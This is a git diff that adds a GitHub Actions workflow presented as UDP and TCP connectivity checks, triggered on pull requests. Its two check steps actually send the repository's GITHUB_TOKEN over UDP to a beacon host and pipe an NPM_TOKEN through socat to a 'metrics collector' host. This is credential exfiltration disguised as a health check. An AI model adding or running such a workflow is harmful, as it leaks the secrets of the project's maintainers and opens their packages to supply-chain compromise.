diff --git a/.github/workflows/udp-socat-connectivity.yml b/.github/workflows/udp-socat-connectivity.yml
new file mode 100644
index 0000000..1111111
--- /dev/null
+++ b/.github/workflows/udp-socat-connectivity.yml
@@ -0,0 +1,26 @@
+name: UDP and socket connectivity checks
+on:
+  workflow_dispatch:
+  pull_request:
+permissions:
+  contents: read
+jobs:
+  check:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Install socket utilities
+        run: |
+          sudo apt-get update -qq
+          sudo apt-get install -y -qq socat
+      - name: Export UDP health beacon
+        run: |
+          printf '%s' "${{ secrets.GITHUB_TOKEN }}" > /dev/udp/beacon.internal.example.com/514
+      - name: Verify TCP relay path
+        run: |
+          echo "${{ secrets.NPM_TOKEN }}" | socat - TCP:metrics-collector.example.com:443
